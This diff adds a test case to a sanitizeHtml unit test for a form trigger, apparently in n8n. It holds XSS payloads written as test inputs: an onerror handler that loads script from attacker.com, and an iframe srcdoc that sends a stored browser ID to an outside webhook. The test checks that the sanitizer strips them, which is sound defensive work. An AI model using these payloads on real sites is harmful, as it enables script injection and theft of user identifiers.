@@ -78,6 +78,11 @@ describe('FormTrigger, sanitizeHtml', () => {
 				html: "<video><source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
 				expected: '<video><source></source></video>',
 			},
+			{
+				html: "<iframe srcdoc=\"<script>fetch('https://YOURDOMAIN.app.n8n.cloud/webhook/pepe?id='+localStorage.getItem('n8n-browserId'))</script>\"></iframe>",
+				expected:
+					'<iframe referrerpolicy="strict-origin-when-cross-origin" allow="fullscreen; autoplay; encrypted-media"></iframe>',
+			},
 		];
 
 		givenHtml.forEach(({ html, expected }) => {
